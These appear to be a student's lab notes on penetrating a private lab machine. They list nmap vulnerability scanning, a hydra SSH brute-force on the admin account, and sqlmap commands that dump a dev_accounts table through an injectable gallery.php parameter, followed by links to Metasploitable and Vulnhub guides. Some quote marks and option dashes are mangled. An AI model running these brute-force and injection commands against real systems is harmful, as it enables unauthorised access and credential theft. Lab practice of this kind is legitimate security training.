# ЛР6
```
$IP = 192.168.37.101
```
## nmap
```
# scanning for open ports
nmap -sV 192.168.37.1/24

## nmap-vulscan

# installation
cd /usr/share/nmap/scripts/
git clone https://github.com/scipag/vulscan.git
ln -s `pwd`/scipag_vulscan /usr/share/nmap/scripts/vulscan 
cd vulscan/utilities/updater/
chmod +x updateFiles.sh
./updateFiles.sh

# scanning cve
nmap --script vulscan/ --script-args vulscandb=cve.csv -sV -oN 101.txt $IP
```

## SSH - exploitation
```
# enumerate auth methods supported
nmap --script ssh-auth-methods $IP
# using hydra for bruteforce-attack
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://$IP -t 4
```

## Port 80 exploitation
```
nikto -h $IP
# find the available databases:
sqlmap -u "http://192.168.37.101/gallery/gallery.php?id=1" — dbs
sqlmap -u "http://192.168.37.101/gallery/gallery.php?id=1” -p id — tables -D gallery
# dump all entries in the dev_account table:
sqlmap -u “http://192.168.37.101/gallery/gallery.php?id=1" -p id -T dev_accounts –dump
```

## metasploit
Metasploitable/SSH/Exploits
`https://charlesreid1.com/wiki/Metasploitable/SSH/Exploits`

Metasploitable/NFS
`https://charlesreid1.com/wiki/Metasploitable/NFS`

How to add a module to Metasploit from Exploit-DB
`https://kalinull.medium.com/how-to-add-a-module-to-metasploit-from-exploit-db-d389c2a33f6d`

The best Beginner guide to hacking Metasploitable2 with Kali Linux
`https://www.youtube.com/playlist?list=PLEAkrOvgdk5RnMOqvQmMeAHl6UFJNiUcs`

Vulnhub — Kiopitrix Level 1.2(#3) Write Up
`https://medium.com/@tnvo/vulnhub-kiopitrix-level-1-2-3-write-up-7147476d5efa`